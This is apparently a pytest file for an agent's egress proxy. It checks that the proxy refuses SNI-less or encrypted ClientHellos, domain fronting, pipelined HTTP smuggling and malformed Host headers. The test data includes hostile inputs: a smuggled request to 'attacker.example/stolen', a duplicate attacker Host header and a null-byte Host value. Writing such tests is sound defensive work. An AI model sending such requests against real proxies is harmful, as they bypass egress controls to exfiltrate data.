from __future__ import annotations

import io
import ssl

import pytest

from agent.transports.pi_assets import egress_proxy


def _client_hello(server_name: str | None) -> bytes:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    incoming = ssl.MemoryBIO()
    outgoing = ssl.MemoryBIO()
    tls = context.wrap_bio(
        incoming, outgoing, server_side=False, server_hostname=server_name,
    )
    with pytest.raises(ssl.SSLWantReadError):
        tls.do_handshake()
    return outgoing.read()


def _replace_sni_extension_type(raw: bytes, hostname: str, replacement: bytes) -> bytes:
    encoded = hostname.encode("ascii")
    marker = (
        b"\x00\x00"
        + (len(encoded) + 5).to_bytes(2, "big")
        + (len(encoded) + 3).to_bytes(2, "big")
        + b"\x00"
        + len(encoded).to_bytes(2, "big")
        + encoded
    )
    assert raw.count(marker) == 1
    return raw.replace(marker, replacement + marker[2:], 1)


def test_client_hello_sni_is_parsed_exactly():
    raw = _client_hello("allowed.example")
    sni, captured = egress_proxy._read_client_hello(io.BytesIO(raw))
    assert sni == "allowed.example"
    assert captured == raw


@pytest.mark.parametrize(
    "payload",
    [
        b"GET / HTTP/1.1\r\n\r\n",
        b"\x16\x03\x01\x00\x20short",
        _client_hello(None),
    ],
)
def test_connect_rejects_nontls_truncated_and_sni_less_clients(payload):
    with pytest.raises(ValueError):
        egress_proxy._read_client_hello(io.BytesIO(payload))


def test_encrypted_client_hello_fails_closed():
    raw = _client_hello("allowed.example")
    ech = _replace_sni_extension_type(raw, "allowed.example", b"\xfe\x0d")
    with pytest.raises(ValueError, match="encrypted ClientHello"):
        egress_proxy._read_client_hello(io.BytesIO(ech))


def test_connect_authority_cannot_front_a_different_tls_sni(monkeypatch):
    monkeypatch.setattr(
        egress_proxy, "ALLOWLIST", {("allowed.example", 443)},
    )
    authority, port = egress_proxy._parse_authority("allowed.example:443", 443)
    sni, _raw = egress_proxy._read_client_hello(
        io.BytesIO(_client_hello("fronted.example"))
    )
    assert (authority, port) == ("allowed.example", 443)
    assert sni != authority


def test_live_proxy_handler_rejects_fronting_before_any_upstream_connect(monkeypatch):
    upstream_calls = []
    monkeypatch.setattr(egress_proxy, "ALLOWLIST", {("allowed.example", 443)})
    monkeypatch.setattr(
        egress_proxy.ProxyHandler,
        "_connect",
        staticmethod(lambda host, port: upstream_calls.append((host, port))),
    )
    handler = object.__new__(egress_proxy.ProxyHandler)
    handler.rfile = io.BytesIO(
        b"CONNECT allowed.example:443 HTTP/1.1\r\n"
        b"Host: allowed.example:443\r\n\r\n"
        + _client_hello("fronted.example")
    )
    handler.wfile = io.BytesIO()
    handler.handle()
    received = handler.wfile.getvalue()
    assert b"200 Connection Established" in received
    assert b"403 Denied" in received
    assert upstream_calls == []


def test_client_hello_may_span_multiple_tls_records():
    raw = _client_hello("allowed.example")
    header, body = raw[:5], raw[5:]
    midpoint = max(1, len(body) // 2)
    fragmented = (
        header[:3] + midpoint.to_bytes(2, "big") + body[:midpoint]
        + header[:3] + (len(body) - midpoint).to_bytes(2, "big") + body[midpoint:]
    )
    sni, captured = egress_proxy._read_client_hello(io.BytesIO(fragmented))
    assert sni == "allowed.example"
    assert captured == fragmented


def test_plain_http_pipelining_is_rejected_before_any_upstream_bytes(monkeypatch):
    upstream_calls = []
    upstream_port = 80
    attacker_request = b"GET http://attacker.example/stolen HTTP/1.1\r\nHost: attacker.example\r\n\r\n"
    upstream_calls = []
    monkeypatch.setattr(egress_proxy, "ALLOWLIST", {("allowed.example", upstream_port)})
    monkeypatch.setattr(
        egress_proxy.ProxyHandler,
        "_connect",
        staticmethod(lambda host, port: upstream_calls.append((host, port))),
    )
    handler = object.__new__(egress_proxy.ProxyHandler)
    handler.rfile = io.BytesIO(
        b"GET http://allowed.example/first HTTP/1.1\r\nHost: allowed.example\r\n\r\n"
        + attacker_request
    )
    handler.wfile = io.BytesIO()
    handler.handle()
    assert b"403 Denied" in handler.wfile.getvalue()
    assert upstream_calls == []


@pytest.mark.parametrize(
    "host_headers",
    [
        b"Host: allowed.example\r\nHost: attacker.example\r\n",
        b"Host:\r\n",
        b"Host: allowed.example\x00evil\r\n",
    ],
)
def test_plain_http_rejects_duplicate_or_malformed_host_before_connect(
    monkeypatch, host_headers,
):
    upstream_calls = []
    monkeypatch.setattr(egress_proxy, "ALLOWLIST", {("allowed.example", 80)})
    monkeypatch.setattr(
        egress_proxy.ProxyHandler,
        "_connect",
        staticmethod(lambda host, port: upstream_calls.append((host, port))),
    )
    handler = object.__new__(egress_proxy.ProxyHandler)
    handler.rfile = io.BytesIO(
        b"GET http://allowed.example/resource HTTP/1.1\r\n"
        + host_headers
        + b"\r\n"
    )
    handler.wfile = io.BytesIO()
    handler.handle()
    assert b"Denied" in handler.wfile.getvalue()
    assert upstream_calls == []
